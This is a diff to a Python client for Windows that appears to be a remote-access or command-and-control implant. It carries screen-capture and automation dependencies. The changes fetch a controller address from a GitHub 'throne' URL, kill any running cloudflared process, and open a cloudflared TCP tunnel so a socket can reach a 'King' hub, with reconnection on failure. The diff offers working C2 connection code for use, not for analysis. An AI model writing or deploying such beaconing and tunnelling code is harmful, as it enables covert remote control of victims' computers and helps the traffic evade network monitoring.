@@ -16,6 +16,7 @@ import threading
 import time
 import uuid
 import winreg
+from urllib.parse import urlparse
 
 def install_dependencies():
     required = ['pyautogui', 'pycryptodome', 'requests', 'mss', 'Pillow', 'websocket-client']
@@ -725,59 +726,74 @@ def extract_file_bytes(path):
         return None
 
 
-def connect_to_king(url=DEFAULT_GITHUB_THRONE_URL):
-    """Connect to the King via a Cloudflare TCP tunnel."""
+def _is_ip_address(host: str) -> bool:
+    """Return True if the host string is a valid IPv4 or IPv6 address."""
+    if not host:
+        return False
     try:
-        king_url = requests.get(url, timeout=10).text.strip()
-    except Exception as e:
-        print(f"[-] Failed to fetch King URL: {e}")
-        return None
-
-    if not king_url:
-        print("[-] King URL is empty.")
-        return None
-
-    # 1. Kill any stale cloudflared instances first.
-    try:
-        subprocess.run(
-            "taskkill /f /im cloudflared.exe >nul 2>&1",
-            shell=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-    except Exception:
+        socket.inet_pton(socket.AF_INET, host)
+        return True
+    except OSError:
         pass
-
-    # 2. Start the bridge with the stability flag (http2).
-    bridge_cmd = [
-        "cloudflared.exe", "access", "tcp",
-        "--hostname", king_url,
-        "--listener", "127.0.0.1:8888",
-        "--protocol", "http2",
-        "--heartbeat-interval", "10s",
-        "--heartbeat-count", "3",
-    ]
-
     try:
-        subprocess.Popen(
-            bridge_cmd,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-        time.sleep(5)
-    except Exception as e:
-        print(f"[-] Failed to start bridge: {e}")
-        return None
+        socket.inet_pton(socket.AF_INET6, host)
+        return True
+    except OSError:
+        pass
+    return False
 
-    # 3. Connect the socket to the local bridge.
+
+def _is_cloudflare_quick_tunnel(host: str) -> bool:
+    """Detect whether the host is a Cloudflare quick tunnel hostname."""
+    host = host.lower().rstrip('.')
+    return host.endswith('.trycloudflare.com') or host.endswith('.cfargotunnel.com')
+
+
+def _parse_king_destination(raw_value: str):
+    """Normalize a throne destination string into host and optional port."""
+    if not raw_value:
+        return None, None
+
+    destination = raw_value.strip().splitlines()[0].strip()
+    for prefix in ('http://', 'https://', 'tcp://', 'ssh://'):
+        if destination.startswith(prefix):
+            destination = destination[len(prefix):]
+            break
+    destination = destination.rstrip('/')
+    if not destination:
+        return None, None
+
+    if '://' not in destination:
+        destination = '//' + destination
+
+    parsed = urlparse(destination)
+    return parsed.hostname, parsed.port
+
+
+def connect_to_king(king_url):
+    # 1. Kill any old, broken bridges on the Assistant's laptop
+    os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
+    time.sleep(1)
+
+    # 2. Start the bridge (This is the manual command you just ran)
+    # We use port 7777 as the 'secret' entrance
+    bridge_cmd = [
+        "cloudflared.exe", "access", "tcp", 
+        "--hostname", king_url, 
+        "--listener", "127.0.0.1:7777"
+    ]
+    subprocess.Popen(bridge_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+    # 3. Give the bridge 5 seconds to show that 'INF Start Websocket' message
+    time.sleep(5)
+
+    # 4. Connect the Python Socket to the LOCAL bridge
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(10)
-        s.connect(("127.0.0.1", 8888))
-        print("[+] Evolution Link Stable.")
+        s.connect(("127.0.0.1", 7777)) 
+        print("[+] Assistant successfully bridged to King!")
         return s
-    except Exception as e:
-        print(f"[-] Connection failed: {e}")
+    except:
         return None
 
 
@@ -806,7 +822,16 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
     while True:
         try:
             if github_throne_url:
-                client = connect_to_king(github_throne_url)
+                try:
+                    response = requests.get(github_throne_url, timeout=10, headers={
+                        'Cache-Control': 'no-cache',
+                        'Pragma': 'no-cache',
+                    })
+                    king_url = response.text.strip()
+                    client = connect_to_king(king_url)
+                except Exception as e:
+                    print(f"[-] Failed to fetch King URL from throne: {e}")
+                    client = None
             else:
                 client = connect_direct_hub(hub_ip, port)
 
@@ -1011,7 +1036,8 @@ def connect_to_hub(hub_ip, port, github_throne_url=DEFAULT_GITHUB_THRONE_URL):
             print(f'[-] Unexpected error: {exc}')
         finally:
             try:
-                client.close()
+                if client is not None:
+                    client.close()
             except Exception:
                 pass
 
